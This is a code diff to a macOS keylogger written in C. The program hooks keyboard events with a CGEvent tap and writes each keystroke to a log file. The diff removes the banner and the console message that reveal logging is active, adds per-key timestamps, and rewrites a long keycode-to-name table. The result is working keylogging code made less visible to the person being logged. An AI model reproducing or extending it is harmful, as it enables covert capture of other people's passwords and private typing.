@@ -41,12 +41,6 @@ int main(int argc, const char *argv[]) {
         exit(1);
     }
 
-    // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
-    fflush(logfile);
-
-    // Display the location of the logfile and start the loop.
-    printf("Logging to: %s\n", logfileLocation);
     fflush(stdout);
     CFRunLoopRun();
 
@@ -61,7 +55,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%lu\t%s\n", (unsigned long)time(NULL), convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
@@ -118,14 +112,14 @@ const char *convertKeyCode(int keyCode) {
         case 46:  return "m";
         case 47:  return ".";
         case 50:  return "`";
-        case 65:  return "[decimal]";
-        case 67:  return "[asterisk]";
-        case 69:  return "[plus]";
-        case 71:  return "[clear]";
-        case 75:  return "[divide]";
-        case 76:  return "[enter]";
-        case 78:  return "[hyphen]";
-        case 81:  return "[equals]";
+        case 65:  return "decimal";
+        case 67:  return "asterisk";
+        case 69:  return "plus";
+        case 71:  return "clear";
+        case 75:  return "divide";
+        case 76:  return "enter";
+        case 78:  return "hyphen";
+        case 81:  return "equals";
         case 82:  return "0";
         case 83:  return "1";
         case 84:  return "2";
@@ -136,54 +130,54 @@ const char *convertKeyCode(int keyCode) {
         case 89:  return "7";
         case 91:  return "8";
         case 92:  return "9";
-        case 36:  return "[return]";
-        case 48:  return "[tab]";
-        case 49:  return "[space]";
-        case 51:  return "[del]";
-        case 53:  return "[esc]";
-        case 54:  return "[cmd]";
-        case 55:  return "[cmd]";
-        case 56:  return "[shift]";
-        case 57:  return "[caps]";
-        case 58:  return "[option]";
-        case 59:  return "[ctrl]";
-        case 60:  return "[shift]";
-        case 61:  return "[option]";
-        case 62:  return "[ctrl]";
-        case 63:  return "[fn]";
-        case 64:  return "[f17]";
-        case 72:  return "[volup]";
-        case 73:  return "[voldown]";
-        case 74:  return "[mute]";
-        case 79:  return "[f18]";
-        case 80:  return "[f19]";
-        case 90:  return "[f20]";
-        case 96:  return "[f5]";
-        case 97:  return "[f6]";
-        case 98:  return "[f7]";
-        case 99:  return "[f3]";
-        case 100: return "[f8]";
-        case 101: return "[f9]";
-        case 103: return "[f11]";
-        case 105: return "[f13]";
-        case 106: return "[f16]";
-        case 107: return "[f14]";
-        case 109: return "[f10]";
-        case 111: return "[f12]";
-        case 113: return "[f15]";
-        case 114: return "[help]";
-        case 115: return "[home]";
-        case 116: return "[pgup]";
-        case 117: return "[fwddel]";
-        case 118: return "[f4]";
-        case 119: return "[end]";
-        case 120: return "[f2]";
-        case 121: return "[pgdown]";
-        case 122: return "[f1]";
-        case 123: return "[left]";
-        case 124: return "[right]";
-        case 125: return "[down]";
-        case 126: return "[up]";
+        case 36:  return "return";
+        case 48:  return "tab";
+        case 49:  return "space";
+        case 51:  return "del";
+        case 53:  return "esc";
+        case 54:  return "cmd";
+        case 55:  return "cmd";
+        case 56:  return "shift";
+        case 57:  return "caps";
+        case 58:  return "option";
+        case 59:  return "ctrl";
+        case 60:  return "shift";
+        case 61:  return "option";
+        case 62:  return "ctrl";
+        case 63:  return "fn";
+        case 64:  return "f17";
+        case 72:  return "volup";
+        case 73:  return "voldown";
+        case 74:  return "mute";
+        case 79:  return "f18";
+        case 80:  return "f19";
+        case 90:  return "f20";
+        case 96:  return "f5";
+        case 97:  return "f6";
+        case 98:  return "f7";
+        case 99:  return "f3";
+        case 100: return "f8";
+        case 101: return "f9";
+        case 103: return "f11";
+        case 105: return "f13";
+        case 106: return "f16";
+        case 107: return "f14";
+        case 109: return "f10";
+        case 111: return "f12";
+        case 113: return "f15";
+        case 114: return "help";
+        case 115: return "home";
+        case 116: return "pgup";
+        case 117: return "fwddel";
+        case 118: return "f4";
+        case 119: return "end";
+        case 120: return "f2";
+        case 121: return "pgdown";
+        case 122: return "f1";
+        case 123: return "left";
+        case 124: return "right";
+        case 125: return "down";
+        case 126: return "up";
     }
-    return "[unknown]";
+    return "unknown";
 }
